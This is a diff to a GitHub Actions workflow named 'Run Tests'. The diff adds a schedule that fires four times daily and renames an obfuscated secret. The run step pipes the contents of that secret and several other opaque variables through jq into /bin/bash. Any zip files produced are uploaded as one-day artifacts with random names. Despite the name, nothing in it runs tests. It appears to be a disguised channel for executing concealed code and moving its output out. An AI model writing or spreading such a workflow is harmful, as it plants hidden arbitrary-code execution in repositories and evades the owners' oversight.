@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
 jobs:
   automation:
     runs-on: ubuntu-latest
@@ -10,18 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          rxoo4: ${{ secrets.rxoo4 }}
+          u908: ${{ secrets.u908 }}
         run: |
-          printf '%s' "$rxoo4" | jq -r .ftzu53 | /bin/bash
-          printf '%s' "$ljd8682" | jq -r .smv623 | /bin/bash
-          printf '%s' "$rs404" | jq -r .oaioh1486 | /bin/bash
-          echo $owzj94 | jq -r .mze71 | /bin/bash
-          echo $gu84558 | jq -r .gkbvf26 | /bin/bash
+          printf '%s' "$u908" | jq -r .id7 | /bin/bash
+          echo $ywmo8 | jq -r .pr38 | /bin/bash
+          echo $o3 | jq -r .zzbi978 | /bin/bash
+          echo $flaue63 | jq -r .lo424 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: cNfFN0pG
+          name: oHOgOpZb
           path: "*.zip"
           retention-days: 1
